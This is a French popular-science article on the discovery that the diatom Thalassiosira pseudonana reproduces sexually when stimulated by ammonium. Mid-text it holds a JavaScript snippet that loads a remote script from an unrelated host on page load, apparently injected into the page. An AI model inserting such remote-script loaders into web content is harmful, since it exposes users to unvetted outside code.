{"title": "La passionnante vie sexuelle des diatomées", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "14/07/2017", "content": "Si microscopiques soient-elles, les diatomées, ces algues unicellulaires qui peuplent nos océans, sont d'un grand intérêt scientifique. Elles représentent notamment une piste pour le piégeage du CO 2  dans les fonds marins. Dans l'espoir de mieux les apprivoiser et, pourquoi pas, de maîtriser leur reproduction, des chercheurs se sont intéressés à leur vie sexuelle. Ce qu'il faut retenir Les diatomées sont à l’origine de la production d’un cinquième de l’oxygène terrestre. Pas moins de 26 laboratoires ont participé au séquençage du génome de  Thalassiosira pseudonana  qui a été achevé en 2004. Jusqu’à présent, les scientifiques pensaient que  T. pseudonana  était asexuée. Or, une équipe de chercheurs vient de mettre en évidence que  T. pseudonana  est capable de reproduction sexuée et que sa libido peut être dopée par un apport en ammonium. « Non seulement elles ont des relations sexuelles, mais nous pouvons même les encourager à en avoir. »  C'est ainsi que Kimberly Halsey, microbiologiste à l' université de l’Oregon  (États-Unis), résume les travaux de recherche menés par son équipe. Les résultats qui viennent d'être publiés montrent en effet que  Thalassiosira pseudonana , une diatomée très étudiée, montre une activité sexuelle insoupçonnée chez ce groupe où le mode de reproduction asexuée est le plus courant. Pour ce faire, le très commun  ion  ammonium peut lui servir d' aphrodisiaque . Les  diatomées  sont des  algues unicellulaires microscopiques . Elles forment l'essentiel du  phytoplancton marin . Cependant, on les trouve dans tous les milieux aquatiques, des eaux douces aux eaux salées en passant par les eaux stagnantes ou les eaux courantes. Leur taille peut varier de quelques  micromètres  à plus de 0,5 millimètre. Leur squelette en  silice , appelé « frustule », est  transparent  et rigide. Il présente une forme et une ornementation particulières à chaque  espèce . Ce qui rend les  diatomées  si intéressantes aux  yeux  des chercheurs, c'est le potentiel qu'elles représentent en  matière  de  nanotechnologies  et de protection de notre environnement. Les diatomées, par exemple, assurent à elles seules quelque 20 % de l'activité de  photosynthèse  recensée sur notre planète. En capturant du  dioxyde de carbone  (CO 2 ), elles produisent ensuite environ un cinquième de l' oxygène  (O 2 ) que nous respirons. De quoi envisager de les exploiter pour lutter contre l'accumulation de CO 2  et les  changements climatiques  qui en résultent. Thalassiosira pseudonana  est une diatomée centrique marine. Sur cette image, en bas, la flèche blanche pointe des spermatozoïdes (en rouge) de la diatomée. Les flagelles sont quant à eux pointés d’un triangle (en haut et en bas sur l'image) ; ils permettent aux spermatozoïdes de voyager jusqu’à un œuf à fertiliser. ©  Oregon State University , CC by-sa 2.0                               L'ammonium stimule la libido des diatomées Pour en revenir plus particulièrement à  Thalassiosira pseudonana , notons que le  séquençage de son génome  avait bien révélé la présence de  gènes  précurseurs de la  méiose , un type de division cellulaire destiné à assurer la reproduction sexuée. Mais la plupart des chercheurs pensaient que cette espèce de diatomée avait simplement perdu la capacité, ou le besoin, d'y avoir recours.  « Lorsque j'ai commencé à observer, chez ces organismes unicellulaires, des structures différentes de l'un à l'autre, j'ai d'abord pensé que mes cultures avaient été contaminées , raconte Éric Moore, un étudiant qui a participé à l'étude.  Jusqu'à ce que je m'aperçoive que ces  morphologies  totalement différenciées correspondaient en réalité à des cellules mâles et des cellules femelles ». Le saviez-vous ? Thalassiosira pseudonana  est le premier phytoplancton marin eucaryote dont le génome complet a été séquencé. Pourquoi ? Parce que cette espèce est largement répandue à travers le monde. Elle constitue ainsi un modèle pour les chercheurs qui étudient la physiologie des diatomées. Et, ce qui ne gâche rien, son génome est relativement réduit : il ne compte que 34 millions de paires de bases, soit un centième de ce que représente le génome humain. La reproduction des diatomées est pleine de mystères. Ainsi, les diatomées centriques telles que  T. pseudonana  sont apparues sur Terre il y a quelque 200 millions d’années. Lorsque le fer et la silice abondent et que le soleil brille, les diatomées se reproduisent en se divisant. Lorsqu’elles deviennent trop petites, elles se transforment en gamètes mâle et femelle pour donner naissance à des petites diatomées ayant retrouvé leur taille originelle.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  De tels résultats avaient déjà été mis en évidence sur des diatomées soumises à un  stress  (privation de  lumière , changements de  salinité  ou dans la disponibilité des  nutriments , etc.) en phase de croissance, mais sans que le phénomène ne puisse être reproduit de manière fiable. Aujourd'hui, les chercheurs de l'université de l'Oregon semblent en capacité de désigner l'ion ammonium comme leur aphrodisiaque ultime (ce composé commun, de formule brute NH 4 + , est présent dans de nombreux produits nettoyants,  désinfectants  et produits métaboliques des animaux). Enfin presque, puisqu'il faut tout de même associer sa présence à l'insuffisance d'au moins un autre  facteur de croissance  cellulaire des diatomées (lumière,  phosphore  ou silice). D'autres études devront venir préciser ces données, mais les chercheurs de l'université de l'Oregon assurent que leurs résultats devraient ouvrir la voie à de nouvelles méthodes de culture et d'élevage des diatomées. Objectif : sélectionner les traits d'utilité pour en optimiser l'exploitation. Chroniques du plancton : les diatomées, ces algues à la carapace de verre                       Les diatomées sont d'étonnantes algues microscopiques protégées par une carapace de silice. Reines de la photosynthèse, elles produisent un quart de l’oxygène de notre planète. Christian Sardet, directeur de recherche au CNRS, nous emmène à leur rencontre en vidéo, dans cet épisode des Chroniques du Plancton.                                       ", "theme": "planete"}